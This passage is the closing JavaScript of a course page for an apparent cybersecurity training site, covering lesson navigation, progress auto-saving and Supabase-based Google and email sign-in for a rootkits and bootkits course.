          indicator.innerHTML = `<i class="fa-solid fa-music"></i> Try Study Music!`;

          musicBtn.style.position = "relative";
          musicBtn.appendChild(indicator);

          setTimeout(() => indicator.remove(), 3000);
        }
      }

      // Initialize Event Listeners
      function initializeEventListeners() {
        // Navigation buttons
        document
          .getElementById("prevLessonBtn")
          ?.addEventListener("click", goToPreviousLesson);
        document
          .getElementById("nextLessonBtn")
          ?.addEventListener("click", goToNextLesson);

        // Reset progress button
        document
          .getElementById("resetProgressBtn")
          ?.addEventListener("click", resetProgress);

        // Mobile menu toggle
        document
          .getElementById("menuToggle")
          ?.addEventListener("click", toggleSidebar);
        document
          .getElementById("sidebarOverlay")
          ?.addEventListener("click", closeSidebar);

        // Keyboard shortcuts
        document.addEventListener("keydown", handleKeyboardShortcuts);

        // Window resize handler
        window.addEventListener("resize", handleWindowResize);

        // Content interaction tracking
        document.getElementById("contentBody")?.addEventListener(
          "scroll",
          debounce(() => {
            trackUserInteraction();
          }, 1000)
        );
      }

      // Keyboard Shortcuts
      function handleKeyboardShortcuts(e) {
        if (document.querySelector(".quiz-question.active")) return;

        if (e.key === "ArrowLeft" && e.ctrlKey) {
          e.preventDefault();
          goToPreviousLesson();
        } else if (e.key === "ArrowRight" && e.ctrlKey) {
          e.preventDefault();
          goToNextLesson();
        }
      }

      // Window Resize Handler
      function handleWindowResize() {
        if (window.innerWidth > 768) {
          closeSidebar();
        }
      }

      // Debounce Helper
      function debounce(func, wait) {
        let timeout;
        return function executedFunction(...args) {
          const later = () => {
            clearTimeout(timeout);
            func(...args);
          };
          clearTimeout(timeout);
          timeout = setTimeout(later, wait);
        };
      }

      // Initialize responsive behavior
      if (window.innerWidth <= 768) {
        document.getElementById("menuToggle").style.display = "inline-flex";
      }

      // Auto-save progress periodically
      setInterval(async () => {
        if (currentUser && Object.keys(courseProgress).length > 0) {
          await saveProgress();
        }
      }, 60000); // Save every minute

      // System initialization logging
      console.log("CyberSec Academy Course System Initialized");
      console.log("Current Course:", COURSE_DATA.title);
      console.log("Total Lessons:", COURSE_DATA.lessons.length);

      // Google OAuth Integration
      const googleBtn = document.querySelector(".btn-google");
      if (googleBtn) {
        googleBtn.addEventListener("click", async () => {
          const { data, error } = await supabase.auth.signInWithOAuth({
            provider: "google",
            options: {
              redirectTo:
                window.location.origin +
                "/courses/rootkits-and-bootkits-complete-course.html",
            },
          });

          if (error) {
            console.error("Google login error:", error.message);
            showToast("Google login failed: " + error.message, "error");
          }
        });
      }

      // Check for existing session
      supabase.auth.getSession().then(({ data }) => {
        if (data.session) {
          console.log("User already logged in:", data.session.user);
          currentUser = data.session.user;
          startCourseSession();
        }
      });

      // Add missing auth modal functions
      function openAuthModal() {
        const modal = document.getElementById("authModal");
        if (modal) {
          modal.style.display = "flex";
        }
      }

      function closeAuthModal() {
        const modal = document.getElementById("authModal");
        if (modal) {
          modal.style.display = "none";
        }
      }

      // Add auth tab switching functionality
      document.getElementById("tabSignIn")?.addEventListener("click", () => {
        document.getElementById("tabSignIn").classList.add("active");
        document.getElementById("tabSignUp").classList.remove("active");
        document.getElementById("signInForm").style.display = "block";
        document.getElementById("signUpForm").style.display = "none";
      });

      document.getElementById("tabSignUp")?.addEventListener("click", () => {
        document.getElementById("tabSignUp").classList.add("active");
        document.getElementById("tabSignIn").classList.remove("active");
        document.getElementById("signUpForm").style.display = "block";
        document.getElementById("signInForm").style.display = "none";
      });

      document
        .getElementById("closeAuthModal")
        ?.addEventListener("click", closeAuthModal);

      // Improved error handling for auth session
      supabase.auth.onAuthStateChange((event, session) => {
        if (event === "SIGNED_IN") {
          currentUser = session.user;
          closeAuthModal();
          startCourseSession();
        } else if (event === "SIGNED_OUT") {
          currentUser = null;
          openAuthModal();
        }
      });

      // Add form submission handlers
      document
        .getElementById("emailSignInForm")
        ?.addEventListener("submit", async (e) => {
          e.preventDefault();
          const email = document.getElementById("signInEmail").value;
          const password = document.getElementById("signInPassword").value;

          try {
            const { data, error } = await supabase.auth.signInWithPassword({
              email,
              password,
            });

            if (error) throw error;

            closeAuthModal();
          } catch (error) {
            showToast(error.message, "error");
          }
        });

      document
        .getElementById("emailSignUpForm")
        ?.addEventListener("submit", async (e) => {
          e.preventDefault();
          const email = document.getElementById("signUpEmail").value;
          const password = document.getElementById("signUpPassword").value;
          const name = document.getElementById("signUpName").value;

          try {
            const { data, error } = await supabase.auth.signUp({
              email,
              password,
              options: {
                data: {
                  full_name: name,
                },
              },
            });

            if (error) throw error;

            showToast(
              "Account created successfully! Please check your email.",
              "success"
            );
          } catch (error) {
            showToast(error.message, "error");
          }
        });
    </script>
  </body>
</html>

